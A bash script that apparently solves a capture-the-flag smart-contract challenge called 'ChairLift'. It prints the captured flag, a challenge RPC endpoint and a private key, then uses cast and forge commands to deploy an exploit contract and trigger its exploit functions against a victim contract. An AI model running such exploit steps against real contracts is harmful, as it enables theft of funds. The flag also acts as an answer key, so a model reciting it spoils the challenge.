#! /bin/bash

# Test file 
# ticket 89286922467
# flag gctf{Y0u_d1d_1t!_Y0u_r34ch3d_th3_p34k!}

# forge test --match path test/Counter.t.sol


# Create contract 

RPC_URL="http://34.159.107.195:18548/a85a2e13-9d81-46c7-9d15-a96fcbdd2590"
PRIVATE_KEY="0x7220d6e5aa460e1e9901115b9e1a4da9945eb3f1e7c85d81f711446be5a3d4fc"
MY_ADDRESS=""
VALUE="10 ether"
SETUP_CONTRACT="0x4f5A8BCAA3D8ca7531E783e106a39a17D9043Cdc"
VICTIM_ADDRESS="0x4aBcD27CE6406fE3614d2DE4180bf4dF9e50F8c5"
TICKET_ADDRESS="0xdC5F7027B032dEEBb6C118904C02a29CA5f59848"
EXPLOIT_CONTRACT="0xe69e8ed3aEA40e703Be82Ff7FF9c94B1370fcc01"

cast call $SETUP_CONTRACT "TARGET()(address)" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast call $VICTIM_ADDRESS "ticket()(address)" --rpc-url $RPC_URL --private-key $PRIVATE_KEY

# forge create --rpc-url $RPC_URL --private-key $PRIVATE_KEY src/ChairLiftExploit.sol:ChairLiftExploit  --constructor-args $TICKET_ADDRESS $VICTIM_ADDRESS

# MY_ADDRESS=$(cast wallet address --private-key $PRIVATE_KEY)
# cast balance --rpc-url $RPC_URL $MY_ADDRESS --ether


# cast send $EXPLOIT_CONTRACT "exploit()()"  --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast call $SETUP_CONTRACT "isSolved()(bool)"  --rpc-url $RPC_URL --private-key $PRIVATE_KEY

# cast send $EXPLOIT_CONTRACT "exploit_again()()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY



